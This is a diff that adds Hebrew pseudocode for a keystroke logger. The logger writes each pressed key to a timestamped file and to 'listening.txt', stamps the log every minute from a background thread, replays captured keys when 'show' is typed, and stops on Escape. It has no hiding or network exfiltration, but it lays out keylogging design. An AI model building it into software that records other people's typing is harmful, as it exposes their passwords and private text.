@@ -1,0 +1,44 @@
+הגדר משתנים:
+  - filename ← שם הקובץ שמבוסס על התאריך והשעה הנוכחית
+  - Last_listen_filename ← "Last_listen.txt"
+  - Current_listening_name ← "listening.txt"
+  - Current_listening ← רשימה ריקה לשמירת מקשים שנלחצו
+
+פונקציה timestemp_everyminute:
+  כל הזמן:
+    קבל את התאריך והשעה הנוכחית
+    פתח את הקובץ filename במצב "הוספה"
+    כתוב לקובץ שורה עם התאריך והשעה
+    סגור את הקובץ
+    המתן 60 שניות
+
+פונקציה on_press(מקש):
+  נסה לקבל את התו של המקש (key.char)
+  אם יש שגיאה, קבל מחרוזת המייצגת את המקש המיוחד
+
+  פתח את הקובץ filename במצב "הוספה"
+  הוסף את המקש ל-Current_listening
+  כתוב את המקש לקובץ filename
+  סגור את הקובץ
+
+  פתח את הקובץ Current_listening_name במצב "הוספה"
+  כתוב את המקש לקובץ Current_listening_name
+  סגור את הקובץ
+
+  אם המקש הוא ESCAPE:
+    עצור את האזנה למקשים
+
+  אם ארבעת התווים האחרונים ב-Current_listening הם "show":
+    אם קיים הקובץ Last_listen_filename:
+      קרא והדפס את תוכן הקובץ Last_listen_filename
+    אחרת:
+      קרא והדפס את תוכן הקובץ Current_listening_name
+
+הפעל את פונקציית timestemp_everyminute ברקע (Thread) בצורה דמונית (daemon)
+
+התחל להאזין למקשים, והפעל את פונקציית on_press בכל הקשה
+
+כאשר ההאזנה מסתיימת:
+  אם קיים הקובץ Last_listen_filename:
+    מחק אותו
+  שנה את שם הקובץ Current_listening_name ל-Last_listen_filename
